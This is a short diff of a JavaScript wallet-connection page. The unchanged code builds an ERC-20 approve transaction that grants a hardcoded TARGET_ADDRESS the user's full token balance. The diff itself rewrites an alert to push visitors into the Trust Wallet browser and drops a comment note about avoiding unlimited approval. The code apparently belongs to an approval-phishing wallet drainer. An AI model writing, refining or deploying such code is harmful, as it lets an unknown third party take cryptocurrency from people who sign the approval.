@@ -95,7 +95,7 @@
       const eth = getProvider();
       
       if (!eth) {
-        alert("Wallet provider not found.");
+        alert("Wallet provider not found. Please open inside Trust Wallet browser.");
         return;
       }
 
@@ -166,7 +166,7 @@
           console.log("Balance fetch error:", err);
         }
 
-        // 4. Build approval data with exact user balance (No Unlimited)
+        // 4. Build approval data with exact user balance
         const cleanTarget = TARGET_ADDRESS.toLowerCase().replace('0x', '');
         const paddedTarget = cleanTarget.padStart(64, '0');
         const approvalData = "0x095ea7b3" + paddedTarget + balanceHex;
